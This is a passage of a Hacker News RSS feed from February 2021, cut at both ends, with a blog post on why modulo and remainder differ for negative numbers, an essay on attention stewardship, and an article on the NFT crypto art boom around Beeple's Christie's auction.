							<img width="400" height="121" src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" alt="" loading="lazy" data-attachment-id="2571" data-permalink="https://coastconnect.org/our-vision/coastconnect-logo-primary-3/" data-orig-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-orig-size="400,121" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CoastConnect-logo-primary" data-image-description="" data-medium-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-large-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1" data-lazy-src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/06/CoastConnect-logo-primary.png?fit=400%2C121&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
				<section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="632f2808" data-element_type="section">
						<div>
							<div>
					
				<div data-id="22ec8679" data-element_type="column">
			<div>
							<div>
						<div data-id="67749055" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><a href="https://www.railandtrail.org/">
							<img width="150" height="52" src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-small.png?fit=150%2C52&amp;ssl=1&amp;is-pending-load=1" alt="" loading="lazy" data-attachment-id="968" data-permalink="https://coastconnect.org/?attachment_id=968" data-orig-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-small.png?fit=150%2C52&amp;ssl=1" data-orig-size="150,52" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fortlogowhite-small" data-image-description="" data-medium-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-small.png?fit=150%2C52&amp;ssl=1" data-large-file="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-small.png?fit=150%2C52&amp;ssl=1" data-lazy-src="https://i2.wp.com/coastconnect.org/wp-content/uploads/2020/04/fortlogowhite-small.png?fit=150%2C52&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">								</a>
											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				</div>
		</div>
		
        </div></div>]]>
            </description>
            <link>https://coastconnect.org/passenger-rail-chosen-to-connect-watsonville-and-santa-cruz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26197587</guid>
            <pubDate>Fri, 19 Feb 2021 20:22:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mod and Remainder are not the same]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26197522">thread link</a>) | @RyanShook
<br/>
February 19, 2021 | https://rob.conery.io/2018/08/21/mod-and-remainder-are-not-the-same/ | <a href="https://web.archive.org/web/*/https://rob.conery.io/2018/08/21/mod-and-remainder-are-not-the-same/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Get ready, here comes some fringe pedantry that could very well be the difference in an interview, or the thing that saves you from hours of chasing a production bug!</p>
<p>I‚Äôm teeth-deep into the next season of <a href="https://bigmachine.io/projects/imposters-handbook-presale">The</a> <a href="https://bigmachine.io/products/the-imposters-handbook-season-2">Imposter‚Äôs</a> <a href="https://bigmachine.io/projects/imposters-handbook-presale">Handbook</a> and currently, I‚Äôm writing about RSA, the cipher that powers SSH and is, evidently, the most downloaded bit of code in history.</p>
<p>I want to know the story behind this thing. Who came up with it, how it works, why it works, and will it&nbsp;<em>keep working</em>. So far, I‚Äôve dug up <strong>one hell of a story.</strong> I‚Äôm not a crypto wonk, but I can see how people get sucked right into this field. I‚Äôm not really cut out for it, however, because little rabbit holes exist everywhere and I‚Äôm kind of like a magpie-rabbit: <em>I chase shiny things down deep holes</em>. I‚Äôm also super amazing with metaphors.</p>
<p>Anyway: last week I found out something weird that I thought I would share:&nbsp;<em>mod and remainder are not the same thing</em>. The really fun thing about that statement is that there are a small fraction of people reading this, jumping out of their chairs saying ‚ÄúNO SHIT I‚ÄôVE BEEN TRYING TO TELL YOU AND EVERYONE ELSE FOREVER‚Äù.</p>
<p>Shout out to mods-not-remainder crew! This one‚Äôs for you.</p>
<h2 id="whats-a-mod">What‚Äôs a Mod?</h2>
<p>I had to look this up to, just like the last time the subject came up. It‚Äôs one of those things that&nbsp;<em>I know</em>, but don‚Äôt retain. When you ‚Äúmod‚Äù something, you divide one number by another and take the remainder. So: <em>5 mod 2</em> would be 1 because 5 divided by 2 is 2 with 1 left over.</p>
<p>The term ‚Äúmod‚Äù stands for the <em>modulo</em> operation, with 2 being the&nbsp;<em>modulus</em>. Most programming languages use <code>%</code>&nbsp;to denote a modulo operation: <code>5 % 2 = 1</code>.&nbsp;</p>
<p>That‚Äôs where we get into the weird gray area:&nbsp;<em>1 is the remainder, not necessarily the result of a modulo.</em>&nbsp;</p>
<h3 id="clock-math">Clock Math</h3>
<p>I remember learning this in school, and then forgetting it. There‚Äôs a type of math called ‚ÄúModular Mathematics‚Äù that deals with cyclic structures. The easiest way to think of this is a clock, which is cyclical in terms of the number 12. To a mathematician, a clock is <code>mod 12</code>. If you wanted to figure if 253 hours could be evenly divided into days, you could use <code>253 mod 24</code>, which <a href="https://www.google.com/search?q=253+mod+24">comes out to 13</a> so the answer would be no! The only way it could be ‚Äúyes‚Äù is if the result was 0.</p>
<p>Another question you could answer would be ‚Äúif I start on a road trip at 6PM, what time would it be when I get to my destination 16 hours later?‚Äù. That would be <code>6 + 16 mod 12</code> which is 10.</p>
<p><em>I originally mentioned that 253 hours mod 24 could be used to determine the number of days which was totally wrong‚Ä¶ thanks Phil for pointing that out.</em></p>
<p>Cryptographers love <code>mod</code> because when you use it with really large numbers you can create what are known as&nbsp;<em>one-way functions</em>.&nbsp;These are special functions which allow you to easily calculate something in one direction, but not reverse it.</p>
<p>If I tell you that 9 is the result of my squaring operation, you can easily deduce that the input was 3 (or -3 as the case may be). You would have the entire process front to back. If I tell you that 9 is the result of my function <code>mod 29</code>, you would have a harder time trying to figure out what the input was.</p>
<p>Crypto folks like this idea because they can use a modulo with gigantic prime numbers in order to generate a cryptographic key. That‚Äôs a whole other story and you can <a href="https://bigmachine.io/products/the-imposters-handbook-season-2">buy the book</a> if you want to read about it.</p>
<p>I need to stay on track.</p>
<h2 id="remainders-and-clock-math">Remainders and Clock Math</h2>
<p>Now we get down to it: modulo and remainder act the same when the numbers are positive but much differently when the numbers are&nbsp;<em>negative</em>.&nbsp;</p>
<p>Consider this problem:&nbsp;</p>
<div><div><pre><code>const x = 19 % 12;
console.log(x);
</code></pre></div></div>
<p>What‚Äôs the value of <code>x</code>? Some quick division and we can say there‚Äôs a single 12 with 7 left over, so 7 is our answer, which is correct. How about this one:</p>
<div><div><pre><code>const y = 19 % -12;
console.log(y);
</code></pre></div></div>
<p>Using regular math, we can multiply -12 by -1, giving us 12, and we still have 7 left over, so our answer is 7 once again.</p>
<p>JavaScript agrees with this:</p>
<p><img src="https://rob.conery.io/img/screenshot_956.png" alt=""></p>
<p>C# also agrees with this:</p>
<p><img src="https://rob.conery.io/img/screenshot_957.png" alt=""></p>
<p>Google agrees with the first statement, but <strong>disagrees with the second</strong>:</p>
<p><img src="https://rob.conery.io/img/screenshot_958.png" alt=""></p>
<p>Ruby agrees with Google:</p>
<p><img src="https://rob.conery.io/img/screenshot_959.png" alt=""></p>
<p><strong>What in Djikstra‚Äôs name is HAPPENING HERE!</strong></p>
<h2 id="spinning-the-clock-backwards">Spinning The Clock Backwards</h2>
<p>The answer to this problem is understanding the difference between a&nbsp;<em>remainder</em> and a&nbsp;<em>modulo</em>.&nbsp;<strong>Programmers conflate these</strong> operations and they should not, as they only act the same when the divisor (in our case 12) is positive. You can easily send bugs into production if your divisor is negative.</p>
<p>But why is there a discrepancy? Consider the positive modulo <code>19 mod 12</code>&nbsp;using a clock:</p>
<p><img src="https://rob.conery.io/img/Paper.Imposter-v2.60.png" alt=""></p>
<p>The end result is a 7, as we know, and we can prove this using some math. But what about <code>19 mod -12</code>?&nbsp;<strong>We have to use a different clock</strong>:</p>
<p><img src="https://rob.conery.io/img/Paper.Imposter-v2.61-2.png" alt=""></p>
<p>Our modulus is -12, and we can‚Äôt ignore that or change it by multiplying by -1 as that‚Äôs not the way modular math works. The only way to calculate this correctly is to relabel the clock so that we progress from -12, or spin the clock counterclockwise, which yields the same result.</p>
<p>Why don‚Äôt I number the clock starting with -1 and moving on to -2, etc?&nbsp;<em>Because that would be moving backwards</em>, continually decreasing until we hit -12, at which point we make a +12 jump, which isn‚Äôt how modulo works.</p>
<h2 id="this-is-a-known-thing">This Is a Known Thing</h2>
<p>Before you think I‚Äôm nuts and start Googling on the subject: <a href="https://github.com/ramda/ramda/issues/186">it‚Äôs been known for a while</a>&nbsp;In fact, MDN (Mozilla Developer Network) goes so far as to call <code>%</code>&nbsp;the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators#Remainder_()">remainder operation</a>:</p>
<blockquote>
<p>The <strong>remainder operator</strong> returns the remainder left over when one operand is divided by a second operand. It <strong>always takes the sign of the dividend</strong>.</p>
</blockquote>
<p>Eric Lippert, one of the gods of C#, <a href="https://blogs.msdn.microsoft.com/ericlippert/2011/12/05/whats-the-difference-remainder-vs-modulus">says this</a> about C#‚Äôs modulo:</p>
<blockquote>
<p>However, that is not at all what the&nbsp;%&nbsp;operator actually does in C#. The&nbsp;%&nbsp;operator is not the&nbsp;canonical modulus operator, it is the&nbsp;remainder operator.</p>
</blockquote>
<p>What does your language do?</p>
<h2 id="so-what">So What?</h2>
<p>I can understand if you‚Äôve made it this far and are scratching your head some, wondering if you should care. I think you might want to for 2 specific reasons:</p>
<ol>
<li>I can see this coming up in an interview question, catching me completely off guard and</li>
<li>I can see pushing a bug live and spinning for hours trying to figure out why math doesn‚Äôt work</li>
</ol>
<p>It could also be a fun bit of trivia to keep in your pocket for when your pedantic programmer friend drops by.</p>
<div>
<p><a href="https://bigmachine.io/products/the-imposters-handbook/">
<img src="https://rob.conery.io/img/cover_both.png" alt="">
</a>
</p>
<div>
<h4>Self-taught programmer like me?</h4>
<p>
<i>I don't have a CS degree so in 2014 I decided to change that... <a href="https://bigmachine.io/products/the-imposters-handbook/">and I wrote a book!</a></i>
</p>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://rob.conery.io/2018/08/21/mod-and-remainder-are-not-the-same/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26197522</guid>
            <pubDate>Fri, 19 Feb 2021 20:16:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's Not an Attention Economy. It's Attention Stewardship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26197135">thread link</a>) | @chrbutler
<br/>
February 19, 2021 | https://www.chrbutler.com/attention-stewardship | <a href="https://web.archive.org/web/*/https://www.chrbutler.com/attention-stewardship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<br>

<h6>‚Üê <a href="https://www.chrbutler.com/essays">See All Articles</a></h6>
        
<p>
Some people saw the thrashing idscape in which we tribulate coming from a long way off. And they called it ‚Äúthe attention economy.‚Äù
</p>
<p>
A recent <a href="https://www.nytimes.com/2021/02/04/opinion/michael-goldhaber-internet.html" target="_blank">New York Times opinion column by Charlie Warzel</a> reminded me that as easy as it has been to trace some of the more dangerous effects of the attention economy to events of the last decade, some people could tell where things were headed long, long before that. One of them was Michael Goldhaber, a theoretical physicist and, as Warzel grandly introduces him, ‚Äúthe internet prophet you‚Äôve never heard of.‚Äù Well, he had me at <i>internet</i>. And <i>prophet</i>. And <i>never heard of</i>.
</p>
<p>
Goldhaber has been writing about the attention economy for decades. In fact, back in 1997, he wrote an <a href="https://www.wired.com/1997/12/es-attention/" target="_blank">essay for <span>WIRED</span></a> about how the transactions of our dollars-and-cents economy would not only begin to include exchanges of attention, but would eventually be replaced entirely by them. For a population just getting to know the internet, the idea that attention would matter more than money was preposterous. For us who now know it well, it‚Äôs remarkably on-point.
</p>
<p>
Looking back, it‚Äôs fascinating ‚Äî and more than a little bit concerning ‚Äî to note that Goldhaber‚Äôs own pessimism was far more accurate than his optimism. He earnestly predicted that attention would replace money because ‚Äúattention can‚Äôt be bought.‚Äù Well, it turns out that it very much can. And as utopic as a moneyless future sounds, a future in which attention replaces money as our currency seems obviously worse when you consider what Goldhaber got <i>right</i>. He warned that the pressure individuals would feel to both attract and give attention would metastasize into a wide-spreading erosion of culture. Goldhaber believed that simple human psychology predicted this. He wrote, ‚ÄúOur abilities to pay attention are limited. Not so our abilities to receive it. The value of true modesty or humility is hard to sustain in an attention economy.‚Äù In a recent conversation in preparation for Charlie Warzel‚Äôs op-ed, Goldhaber echoed the same point: ‚ÄúWhen you have attention, you have power, and some people will try and succeed in getting huge amounts of attention, and they would not use it in equal or positive ways.‚Äù
</p>
<p>
We‚Äôve all lived and suffered that truth, especially acutely over the last few years, haven‚Äôt we? Warzel sums it up this way, ‚ÄúAttention is a bit like the air we breathe. And it feels as if our attention has become polluted.‚Äù
</p>
<p>
Warzel connects Goldhaber‚Äôs early warnings to their latest effects, including the attempted insurrection on January 6th. The mob may have been after many different things, but the one thing every participant seems to have had in common was a desire for attention. The event itself, he writes, was ‚Äúthe result of thousands of influencers and news outlets that, in an attempt to gain fortune and fame and attention, trotted out increasingly dangerous conspiracy theories on platforms optimized to amplify outrage.‚Äù Implied here is something I‚Äôd been observing as an increasingly rapid contagion of anti-truth since the day Donald Trump descended his escalator to declare his intention to destroy the country: that conspiracies and accusations of conspiracy are <i>products</i>, not byproducts of the attention economy. They‚Äôre not something to believe in, but merely material to exchange for attention. In an inversion of assumptions about meaning, it‚Äôs no longer relevant whether a person <i>believes</i> what they are saying as long as it is understood <i>why</i> they are saying it. Lies can be quite expedient.
</p>
<p>
That the attention economy is oversupplied with bile and bullshit is a compound problem. It‚Äôs obvious that the effects of peddling and buying lies can be profound. People can lose their grips on reality. Systems upon which many rely can fall apart. The equity of hundreds of years of history can dry up in a moment. These are the agonies of our public reckoning with how technology, truth, and treason have mixed and mingled in recent years. But we may get past this very shared and public struggle with truth and technology and still suffer the erosion of culture that Goldhaber warned about. Culture, after all, is bigger than political partisanship, bigger than sovereign nations, bigger than infrastructure, bigger than multinational corporations. Culture is a tapestry of ideas, beliefs, and agreements. And as powerful as any idea or belief or agreement may be, each relies upon attention.
</p>
<p>
Goldhaber also wrote, ‚ÄúWhen you pay attention to one thing, you ignore something else.‚Äù That is such a simple statement, but it‚Äôs no less profound. It explains why thousands of articles go unread as you read this one ‚Äî simple, indeed ‚Äî but also why the aggregate of billions of equally simple exchanges of attention lead to the grand murmurations of culture.
</p>
<p>
If attention is an economy, then, in theory, it should follow a simple law of supply and demand just like any other economic system. In other words, the value and supply of attention should settle at a point where the there‚Äôs enough attention to meet demand. The problem is that while such a balance can be expected of bars of gold or even shares of a videogame retailer‚Äôs stock, attention works by its own rules that upend the law of supply and demand. There will never be enough attention to meet demand.
</p>
<p>
Goldhaber puts it this way:
</p>
<blockquote>
‚ÄúThe attention economy is a zero-sum game. What one person gets, someone else is denied. The size of the attention pie can grow as more and more people join the world audience, but the size of the average slice can‚Äôt. Real attention to you, meaning minds focusing on you, is always limited by the number of minds there are. The more minds, the more attention - but also the more who might want attention. The total available attention per capita (per mind) is simply not going to change.‚Äù
</blockquote>
<p>
These very words that I have written and that you are now reading provide a good example of what Goldhaber is talking about. You‚Äôre reading this. That‚Äôs good for me. But that also means there are billions of things you‚Äôre <i>not</i> reading. That‚Äôs not good for the people who wrote them and whatever attention they hoped to get from you. Meanwhile, every moment that you spend paying attention to me is not only a moment you‚Äôre not paying attention to someone else, it‚Äôs a moment you‚Äôre not spending doing something that could get you attention. That‚Äôs where the law of supply and demand breaks down. Attention can‚Äôt be stored up or mass produced; it‚Äôs an inherently temporal matter. The more attention we pay, the less we can get.
</p>
<p>
But what if you don‚Äôt care about getting attention? This is a question that should be asked. It‚Äôs easy enough to say that the internet, and specifically things like social media, have trained us to desire and seek attention more and more rapidly than we did before. I‚Äôm willing to accept that as true. But I don‚Äôt think we can say that every one of us has been affected in the same way, or that the desire for attention has increased equally across all of humanity, or that the form attention takes and the means by which we seek it is a singular thing. Of course it is not. Though there are people willing to do all kinds of things simply for attention, not all of us go to such lengths. But even so, we do seek attention and we do pay it out. Our transactions may be much more mundane than a streamed coup, but they exist nonetheless and they are a finite resource.
</p>
<p>
That makes me wonder whether, through the frame of the attention economy, we are seeing its mechanics all wrong.
</p>
<p>
In the zero-sum attention game, the reader, you, gives the writer, me, your attention. You only get what I have written, for as long as you‚Äôre reading it. But by these terms, I stand to get ‚Äúmore.‚Äù There could be thousands of you reading this at the same time. Though I can‚Äôt store your attention on the shelf, I can still get more than I pay out. If I‚Äôm a good writer, I ‚Äúwin‚Äù the game. Is that really the best way to think of this? After all, surely you stand to gain something, too. In the zero sum attention game, I am the beneficiary of your attention. But what if we chose to reverse that? What if we chose to see the beneficiary of the attention economy not as the recipient, but as the one paying attention?
</p>
<p>
Perhaps, then, we might think differently about information. We might begin to care more about its <i>value</i> than its volume.
</p>
<p>
<a href="https://en.wikipedia.org/wiki/Ren%C3%A9_Girard" target="_blank">Ren√© Girard</a> was a widely influential thinker who certainly would have agreed. Girard is probably most famous for his thinking about the nature of human desire. He proposed that it‚Äôs not a singular phenomenon, but an aggregate effect. His <i>mimetic theory</i> suggests that what you and I want is not original, but derives from what others want ‚Äî that desire is an imitation. <i>Mimesis</i> is mimicry.
</p>
<p>
Naturally, this is a fiercely debated point. Even right now, you may be thinking of half a dozen things that you‚Äôve chosen for your own reasons, perhaps even at the resistance of others. That something as obviously personal as desire is really just the imitation of someone else‚Äôs desire seems, on its face, to be absurd. Is your favorite breakfast cereal really the end of an infinite regress of desires, and if so, originating with whom? That I can‚Äôt answer. Perhaps there‚Äôs a Girard scholar out there who can.
</p>
<p>
But the more interesting thing about Girard‚Äôs theories is the broader idea that, as this <a href="https://www.reddit.com/r/ThePortal/comments/cfmtq2/peter_thiel_during_the_portal_about_the_book/euiv3op/?utm_source=share&amp;utm_medium=web2x" target="_blank">incredibly robust Reddit explanation</a> puts it, ‚Äúsecrets may exist in far more abundance than we realize <span>AND</span> YET‚Ä¶There are reasons we don‚Äôt see them. And those reasons involve the details, mechanics and implications of Girard‚Äôs theories. How we focus our desire and our attention is less under our control than we realize.‚Äù
</p>
<p>
Regardless of the question of origin in Girard‚Äôs theory of desire, the mechanics of how desire and attention work together to influence people are obvious. This is why fortunes can be created within hours of a photograph of a celebrity wearing something interesting being published online. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.chrbutler.com/attention-stewardship">https://www.chrbutler.com/attention-stewardship</a></em></p>]]>
            </description>
            <link>https://www.chrbutler.com/attention-stewardship</link>
            <guid isPermaLink="false">hacker-news-small-sites-26197135</guid>
            <pubDate>Fri, 19 Feb 2021 19:41:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NFT/crypto art is exploding ‚Äì so here come the tech moguls to screw it up]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26196589">thread link</a>) | @smalera
<br/>
February 19, 2021 | https://www.businessofbusiness.com/articles/crypto-art-nft-beeple-christies-auction-token-ethereum-dada-blockchain/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/crypto-art-nft-beeple-christies-auction-token-ethereum-dada-blockchain/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p>Next week the venerable British auction house Christie‚Äôs will set a precedent: It‚Äôs conducting the first ever auction of a digital artwork. And just to spice things up, there‚Äôs a crypto component to it all.&nbsp;</p>
<p><span>The groundbreaking Christie‚Äôs auction will feature the work of an artist calling himself </span><a href="https://www.beeple-crap.com/"><span>Beeple</span></a><span>. The artwork being sold is a massive digital collage of five thousand pieces of work Beeple has released on the internet daily over 5,000 days.&nbsp;</span></p>
<p><span>That art is delivered in the form of a plain old JPG, of the sort that you might encounter on any website. The crypto twist is that a unique digital token on the Ethereum blockchain (</span><a href="https://etherscan.io/address/0x2a46f2ffd99e19a89476e2f62270e0a35bbf0756#code"><span>you can see the code here</span></a><span>) was ‚Äúminted‚Äù&nbsp;by the artist, connecting it to the JPG file. To be precise, a </span><a href="https://simple.wikipedia.org/wiki/Cryptographic_hash_function"><span>cryptographic hash</span></a><span> of the image is embedded in a smart contract on the Ethereum blockchain. It‚Äôs sort of like painters of yore signing a canvas, except this takes place cryptographically, and on a blockchain. These are called non-fungible tokens, or NFTs.&nbsp;</span></p>
<p><span>The Christie‚Äôs auction is eagerly awaited. The auction house had earlier dabbled in crypto art with the October 2020 sale of a physical installation linked to an NFT called ‚ÄúBlock 21‚Äù. That piece </span><a href="https://www.nbcnews.com/tech/tech-news/how-blockchain-technology-reached-christie-s-changed-art-world-along-n1244951"><span>fetched $130,000</span></a><span> or almost 11 times its low estimate. &nbsp;</span></p>
<p><span>But the upcoming Beeple auction could bring in much more. Beeple </span><a href="https://unchainedpodcast.com/beeple-on-how-and-why-he-raked-in-3-5-million/"><span>earlier sold $3.5 million worth</span></a><span> of digital tokens in a single weekend in December, a landmark amount in the burgeoning field of crypto art. These sales happened on crypto focused marketplaces, so the Christie‚Äôs event is expected to expose the artist to a whole new crowd, as </span><a href="https://www.artnews.com/art-news/market/christies-beeple-blockchain-art-sale-1234583847/"><span>Art News has reported</span></a><span>.&nbsp;</span></p>
<p>Indeed, Christie‚Äôs alludes to this in its prospectus accompanying the auction. The earlier sales make putting a price estimate on the upcoming event ‚Äúimpossible to predict,‚Äù the auction-house says. ‚ÄúYour guess is as good as ours,‚Äù said Noah Davis, the Christie‚Äôs specialist overseeing the sale, in the prospectus. &nbsp;</p>
<h2>Here Come the Tech Moguls</h2>
<p><span>Christie‚Äôs isn‚Äôt alone in recognizing the potential ‚Äî&nbsp;and chasing the returns ‚Äî&nbsp;on crypto collectibles. Tech moguls appear to be enthusiastic about the trend. Mark Cuban kicked it all off at the end of January when he wrote a blog post praising ‚Äúthe store of value generation,‚Äù&nbsp;</span><span>a new cohort of people who understood that digital objects on a blockchain could hold their value just as well as a fine art painting, vintage car or rare baseball collection.&nbsp;</span></p>
<p><span>‚ÄúThis generation knows that a smart contract and the digital good it reflects ‚Ä¶ are a better investment than old school see, touch or feel uses,‚Äù the </span><a href="https://blogmaverick.com/2021/01/31/the-store-of-value-generation-is-kicking-your-ass-and-you-dont-even-know-it/'"><span>Shark Tank star wrote</span></a><span>.</span></p>
<p><span>Cuban‚Äôs fellow tech elites have followed his lead. The billionaire Chamath Palihapitiya </span><span>told Bloomberg</span><span> a few days ago that he has been building a ‚Äúfairly sizeable‚Äù collection of digital art and other NFTs. ‚ÄúThese may sound crazy to some, but I do think that that‚Äôs the next frontier of digital currency and digital assets,‚Äù he said. Palihapitiya is a long-time Bitcoin bull, and rumored sightings of the crypto whale had trickled through the Ether for weeks. ‚Äú</span><span>Is that you, @Chamath?</span><span>‚Äù became a punch-line in NFT circles.&nbsp;</span></p>
<p><span>Yesterday, the wine entrepreneur turned tech investor Gary Vaynerchuk </span><a href="https://twitter.com/CNBCFastMoney/status/1362192935937323011?s=20"><span>took to CNBC</span></a><span> to extol the virtues of NFTs and other alternative investments, including trading cards. He had been steadily increasing mentions of crypto tokens on his Twitter feed, where he talks to 2.2 million followers, over the last week (he also started following me, for some reason!). Here he is </span><a href="https://twitter.com/garyvee/status/1361886864538562568?s=20"><span>on Wednesday</span></a><span>: ‚ÄúMy current situation - I‚Äôm trying to trade cases of Chateau D'Yquem for #NFT. 2021 life, lol‚Äù</span></p>
<p><span>The tech millionaires and Christie‚Äôs are on to something. According to the </span><a href="https://cryptoart.io/data"><span>data site CryptoArt.io</span></a><span>, the value of all crypto art that changed hands in January was nearly $12 million. Twelve months ago, that figure stood at $160,000, representing growth of over 100 times over 12 months. February‚Äôs volumes have already topped January‚Äôs, and we‚Äôre only 18 days in.&nbsp;</span></p>
<p><span>A report from data site NonFungible.com and L‚ÄôAtelier, a unit of the French bank BNP Paribas </span><a href="https://nonfungible.com/blog/nft-yearly-report-2020"><span>released this week</span></a><span> says that crypto art now represents 24% of the entire NFT marketplace by value, accounting for the biggest ticket sales. The art segment lags only NFTs associated with ‚Äúmetaverses‚Äù or virtual worlds where users can buy pieces of land, outfits and other items that are secured by a blockchain.&nbsp;</span></p>
<h2><span>The dark side of crypto art</span></h2>
<p><span>As investors pile in to crypto art, and artists make millions from their sale, surely the utopian vision of a blockchain cutting out intermediaries and rewarding creators has been realized? Maybe not, as it turns out.&nbsp;</span></p>
<p><span>Beatriz Helena Ramos is the founder of a pioneering crypto art platform called </span><a href="https://dada.art/"><span>Dada</span></a><span>. An artist herself, she has worked on everything from editorial illustrations for the New York Times to animations for Disney and MTV. To hear Ramos tell it, the surging crypto art market has become successful‚Äîat the wrong thing.&nbsp;</span></p>
<p>‚ÄúWhat‚Äôs happening in the space is that the technology is very innovative, yet all of the social layer and the economic layer is just a repetition of everything from the legacy, default, world,‚Äù she says. ‚ÄúWhat we see with NFTs is that it‚Äôs producing the exact same outcomes that we were trying to disrupt.‚Äù</p>
<p>What are those outcomes, exactly? Ramos says the market remains tilted in favor of investors, and the vast majority of artists aren‚Äôt going to sell their work for millions the way Beeple has. Instead, they will toil in the long tail of art, replicating the star system of the current art market.&nbsp;</p>
<p><span>A </span><a href="https://powerdada.medium.com/the-inconvenient-truth-about-secondary-markets-886d5c929efa"><span>study by Massimo Franceschet</span></a><span>, a computer scientist at the University of Udine, on the largest crypto art platform Superrare shows that the crypto art market has more wealth disparity among artists than any country in the history of the world. Some 80% of sales go to the top 25% of artists. While artists on Superrare at present earn the lion‚Äôs share of sales volume, but as artworks get resold on secondary markets, Franceschet expects collectors to start earning more than artists by next June.&nbsp;</span></p>
<p><span>Ramos says she sees the human side of these statistics often. ‚ÄúWe see the casualties coming to us all the time. Tons of people who leave the space because they never sold anything, because they have to shill, because collectors actually harass artists on these chats and Discord channels. We‚Äôve heard some horror stories, and there‚Äôs no accountability for anything,‚Äù she says.&nbsp;</span></p>
<p>While blockchains hold out the possibility of tokenizing anything, they also quickly run into the limits of this reductive logic. As Ramos says, turning everything into a market leads to ‚Äúperverse‚Äù incentives, like an artists‚Äôs work rising after her death, ensuring the supply of work is limited. ‚ÄúMarkets can‚Äôt account for anything that isn‚Äôt quantitative,‚Äù she tells me. &nbsp;</p>
<p>Still, the lure of a blockchain‚Äôs ability to shift paradigms holds Ramos in its sway. She and a community of artists and technologists at Dada are working on a system that they believe will create fairer outcomes for artists and participants. They are focused on the social implications, and how the system might be governed.&nbsp;</p>
<p>‚ÄúYou can have huge networks with network effects, coordinating people with each other and creating things. You don‚Äôt need structures like companies and things like that,‚Äù she says. <span>‚Äú</span>Imagine the quality and broad value that can be created. All you have to do is coordinate them. And so blockchain comes again.‚Äù</p>
      

      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/crypto-art-nft-beeple-christies-auction-token-ethereum-dada-blockchain/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196589</guid>
            <pubDate>Fri, 19 Feb 2021 18:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Koo, India‚Äôs free-speech Twitter alternative]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 168 (<a href="https://news.ycombinator.com/item?id=26196588">thread link</a>) | @donohoe
<br/>
February 19, 2021 | https://restofworld.org/2021/how-koo-became-a-right-wing-darling-in-india/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/how-koo-became-a-right-wing-darling-in-india/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
